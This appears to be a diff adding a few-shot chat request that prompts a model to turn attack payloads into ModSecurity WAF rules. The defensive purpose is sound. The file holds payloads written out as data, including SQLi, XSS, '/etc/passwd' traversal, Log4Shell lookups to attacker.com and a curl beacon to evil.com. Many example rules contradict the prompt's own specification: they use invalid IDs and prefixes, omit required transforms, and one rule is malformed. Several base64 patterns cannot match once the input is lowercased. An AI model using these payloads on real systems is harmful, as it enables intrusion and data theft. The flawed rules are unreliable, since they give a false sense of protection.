@@ -1,0 +1,167 @@
+{
+    "messages": [
+        {
+            "role": "system",
+            "content": "You are a ModSecurity CRS rule generator.\n\nYour job: read JSON payloads \u2192 detect real attack patterns \u2192 generate ModSecurity v3 rules that reliably block the core malicious logic, NOT superficial or easily changeable text.\n\nYour rules MUST work for HTTP requests with bodies sent as:\n\napplication/x-www-form-urlencoded (HTML forms)\nmultipart/form-data (file uploads, complex forms)\napplication/json (APIs, AJAX, REST)\n\nIn all cases, you operate on ModSecurity collections (ARGS, REQUEST_BODY, etc.), NOT on raw wire format.\n\n============================================================\nRULE SET YOU MUST FOLLOW\n\n1.You must output only valid ModSecurity rules inside a single Markdown code block:\n<rules here>\nNo explanations, no comments, no extra text before or after the block.\n\n2. Input is ALWAYS a JSON string in this format:\n{\"payloads\":[\"...\",\"...\"]}\n\nYou MUST:\n- Parse the JSON.\n- Extract each string in the \"payloads\" array.\n- Treat each extracted string as a potential attack payload that may appear:\n  + as a form field value (application/x-www-form-urlencoded),\n  + as a JSON key or value (application/json),\n  + as a multipart field or filename (multipart/form-data),\n  + or in query params, headers, cookies, or path.\n  \n3. After detect attack type (sqli - SQL injection, xss - Cross-site attack, cmdi - Command injection, path_traversal.conf - Path traversal / LFI / RFI), use tool read_rule_file to read already exist rules before write new rule(s)\n\n4. Focus on core attack behavior, NOT literal outer text.\nFor example:\n\nSQLi: detect operators, boolean logic, UNION chains, comment markers, stacked queries, typical SQL functions.\nXSS: detect script execution vectors (script tag, event handlers, javascript: URI, iframe/srcdoc, inline handlers).\nPath traversal / LFI / RFI: detect traversal sequences and sensitive file paths, including encoded/obfuscated forms.\nCommand injection / RCE: detect shell operators (;, &&, ||, |, backticks, $( ), redirections) combined with real shell commands.\nDo NOT rely on outer words (like \u201cadmin\u201d, \u201ctest\u201d, arbitrary parameter names) that attackers can easily change.\n\n5. You must inspect payloads across ALL relevant ModSecurity variables so that rules work regardless of Content-Type:\nREQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES|XML:/*\n\nThis ensures coverage for:\napplication/x-www-form-urlencoded \u2192 ARGS, REQUEST_BODY\nmultipart/form-data \u2192 ARGS, REQUEST_BODY\napplication/json \u2192 REQUEST_BODY (JSON processor), ARGS (if mapped), XML:/* if XML\nplus URL, query string, headers, cookies, etc.\n\n6. For each extracted payload:\n\nIf it is malicious \u2192 generate ONE ModSecurity rule for that payload.\nIf it is safe or clearly benign \u2192 do NOT generate any rule.\n\n7. All rules MUST include:\n\nphase:2,deny,status:403,log\nTransforms (in this order, exactly):\nt:none,t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:lowercase,t:removeNulls\nAnd both:\nmsg:'<description>', logdata:'Matched Data: %{MATCHED_VAR}'\n\n8. Rule IDs must be 6 digits and use these prefixes:\nSQLi \u2192 901xxx\nXSS \u2192 902xxx\nCommand Injection / RCE \u2192 903xxx\nPath Traversal / LFI / RFI \u2192 904xxx\n\nYou must ensure IDs are unique within the generated rules.\n\n9. You MUST escape regex and special characters correctly:\nUse double backslashes (\\) where needed in regex or strings, as required by ModSecurity v3 syntax.\n\n10. Only use \"chain\" when the attack requires multiple dependent conditions (for example, UNION + SELECT + FROM).\nDo NOT use chain for single-pattern detections.\n\nCorrect chain style:\nSecRule VARIABLES \"@rx first_pattern\" \"id:901010,phase:2,deny,status:403,log,msg:'...',logdata:'Matched Data: %{MATCHED_VAR}',t:none,t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:lowercase,t:removeNulls,chain\"\nSecRule VARIABLES \"@rx second_pattern\" \"t:none,t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:lowercase,t:removeNulls\"\n\n11. Your rules must be robust against:\n\nURL encoding and double-encoding\nHTML entity encoding\nUnicode / UTF-8 / UTF-16 obfuscation\nBase64-encoded payloads (you may detect characteristic substrings)\nWhitespace tricks and comment-based obfuscation\nPayloads embedded inside JSON strings, form parameters, headers, or multipart parts\n\n12. Choose tool write_to_file or rewrite_rule_file and write rule(s) into configure file.\n\n13. If end writing rule, generate \"End!\" at output.\n\n============================================================\nFINAL INSTRUCTION\n\nAfter parsing all payloads:\n\nGenerate one ModSecurity rule per clearly malicious payload.\n\nUse the correct ID prefix per attack class.\n\nNo explanations, no commentary, no plain text outside this block. If end rule writing, generate \"End!\" at output.\n"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"admin' OR 1=1 --\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES \\\n \"@rx (?i)(?:'|\\\")\\s*(?:or|and)\\s*(?:[0-9]+(?:[*/+-][0-9]+)*|'[^']*'|\\\"[^\\\"]*\\\")(?:\\s*=\\s*(?:[0-9]+(?:[*/+-][0-9]+)*|'[^']*'|\\\"[^\\\"]*\\\"))?(?:\\s*(?:--|#|/\\*.*?\\*/))?\" \\\n \"id:9001001,phase:2,deny,log,status:403,msg:'Possible SQLi boolean-based / tautology',t:none,t:urlDecode,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"test' UNION SELECT null,null,null --\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES \\\n \"@rx (?i)union(?:[\\s/*+-]|%0A|%0D)+select\" \\\n \"id:901002,phase:2,deny,status:403,log,msg:'SQLi union-based extended',t:none,t:urlDecode,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"<script>alert(1)</script>\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES \\\n \"@rx (?i)<script[^>]*>.*?</script>\" \\\n \"id:902001,phase:2,deny,status:403,log,msg:'XSS script tag',t:none,t:urlDecode,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"<img src=x onerror=alert(1)>\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES \\\n \"@rx (?i)<\\s*(?:img|svg|a|iframe|div|span|body|script)[^>]*on\\w+\\s*=\\s*(?:\\\"[^\\\"]*\\\"|'[^']*'|[^\\s>]+)\" \\\n \"id:9001003,phase:2,deny,log,status:403,msg:'XSS event handler',t:none,t:urlDecode,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"../../../etc/passwd\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES|XML:/* \\\n \"@rx (?i)(?:\\.\\.\\/)+(?:etc\\/passwd|etc\\/shadow|etc\\/hosts|boot\\.ini|windows\\/win\\.ini|\\.ssh\\/authorized_keys)\" \\\n \"id:904001,phase:2,deny,status:403,log,msg:'Path traversal / LFI attempt',logdata:'Matched Data: %{MATCHED_VAR}',t:none,t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:lowercase,t:removeNulls\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"test; ls\", \"a && whoami\", \"x | cat /etc/passwd\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES \\\n \"@rx (?i)(?:;|&&|\\|)\\s*(?:ls|id|whoami|cat|uname|curl|wget)\" \\\n \"id:903001,phase:2,deny,status:403,log,msg:'Command Injection detected',t:none,t:urlDecode,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:removeNulls\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES \\\"@rx (?i)(?:phnjcmlwd|c2NyaXB0|PHNjcmlwd|aW1n|b25lcnJvcg|b25sb2Fk|b25jbGljaw|amF2YXNjcmlwd)\\\" \\\"id:902003,phase:2,deny,status:403,log,msg:'XSS base64-encoded (script/img/event handlers)',logdata:'Matched Data: %{MATCHED_VAR}',t:none,t:urlDecode,t:urlDecodeUni,t:lowercase,t:removeNulls\\\"```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"{\\\"cmd\\\":\\\"id\\\"}\", \"{\\\"name\\\":\\\"a; ls -la\\\"}\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS \"@rx (?i)(?:;|&&|\\|)\\s*(?:ls|id|whoami|cat|uname|curl|wget)\" \\\n \"id:903003,phase:2,deny,status:403,log,msg:'Command Injection in JSON/body',t:none,t:urlDecode,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:removeNulls\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"c2NyaXB0\", \"PHNjcmlwd\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|QUERY_STRING|REQUEST_HEADERS|REQUEST_COOKIES \\\n \"@rx (?i)(?:c2NyaXB0|phnjcmlwd)\" \\\n \"id:902004,phase:2,deny,status:403,log,msg:'XSS base64-encoded short variants',t:none,t:urlDecode,t:urlDecodeUni,t:lowercase,t:removeNulls\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"1 AND (SELECT 1 FROM (SELECT SLEEP(10))x)\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule ARGS|REQUEST_BODY|QUERY_STRING \"@detectSQLi\" \\\n \"id:981173,phase:2,deny,status:403,log,msg:'SQLi time-based blind (SLEEP/BENCHMARK)',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"' OR BENCHMARK(10000000,MD5(1))--\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|QUERY_STRING \"@rx (?i)benchmark\\s*\\(\\s*[0-9]+\\s*,\" \\\n \"id:981174,phase:2,deny,status:403,log,msg:'SQLi time-based using BENCHMARK',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"java.lang.Runtime.getRuntime().exec('ping -c 4 evil.com')\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|QUERY_STRING \"@rx java\\.lang\\.(?:Runtime|ProcessBuilder)\" \\\n \"id:930120,phase:2,deny,status:403,log,msg:'Java RCE attempt (Runtime/ProcessBuilder)',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"${jndi:ldap://attacker.com/a}\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|ARGS_NAMES|REQUEST_HEADERS|QUERY_STRING \"@rx \\$\\{(?i:jndi:|ldapi?|dns:|rmi:|http:|\\/\\/[a-z0-9\\-\\.]{5,}\\/)\" \\\n \"id:942500,phase:2,deny,status:403,log,msg:'Log4j/Log4Shell RCE pattern detected',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"{{7*7}}\", \"${7*7}\", \"<%= 7*7 %>\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|QUERY_STRING \"@rx (?:\\{\\{.*\\}\\}|\\$\\{.*\\}|<%=.*%>)\" \\\n \"id:941120,phase:2,deny,status:403,log,msg:'Server-Side Template Injection (SSTI)',t:none,t:urlDecodeUni\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"O:4:\\\"vuln\\\":1:{s:4:\\\"data\\\";s:20:\\\"<?php system('id'); ?>\\\";}\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS \"@rx O:[0-9]+:\\\"[^\\\"]{0,32}\\\":[0-9]+:\\{.*(?:system|exec|passthru|shell_exec|popen|eval)\\s*\\(\" \\\n \"id:933150,phase:2,deny,status:403,log,msg:'PHP Object Injection / Deserialization RCE',t:none,t:urlDecodeUni\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"; curl http://evil.com/beacon\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|QUERY_STRING \"@rx (?i)(?:;|%3B|\\||%7C|&&|%26%26)\\s*(?:curl|wget|nc|netcat|ncat|bash|sh|powershell)\" \\\n \"id:932180,phase:2,deny,status:403,log,msg:'Outbound command execution / SSRF beaconing',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"http://169.254.169.254/latest/meta-data/\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule ARGS|REQUEST_BODY|QUERY_STRING \"@rx http[s]?://(?:169\\.254\\.169\\.254|metadata\\.google\\.internal|100\\.100\\.100\\.200).*?(?:meta-data|instance|api)\" \\\n \"id:942440,phase:2,deny,status:403,log,msg:'AWS/Google Cloud metadata SSRF attempt',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"javascript:alert(1)\", \"vbscript:MsgBox(1)\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule ARGS|REQUEST_BODY|QUERY_STRING \"@rx (?i)(?:javascript|vbscript|data|mocha|livescript):\" \\\n \"id:941380,phase:2,deny,status:403,log,msg:'XSS via pseudo-protocol handler',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        },
+        {
+            "role": "user",
+            "content": "{\"payloads\":[\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\"]}"
+        },
+        {
+            "role": "assistant",
+            "content": "```\nSecRule REQUEST_BODY|ARGS|QUERY_STRING \"@rx eval\\s*\\(\\s*String\\.fromCharCode\" \\\n \"id:941400,phase:2,deny,status:403,log,msg:'XSS via fromCharCode/eval obfuscation',t:none,t:urlDecodeUni,t:lowercase\"\n```"
+        }
+    ],
+    "model": "openai/gpt-oss-120b",
+    "temperature": 2,
+    "max_completion_tokens": 8192,
+    "top_p": 1,
+    "stream": true,
+    "reasoning_effort": "high",
+    "stop": null
+}
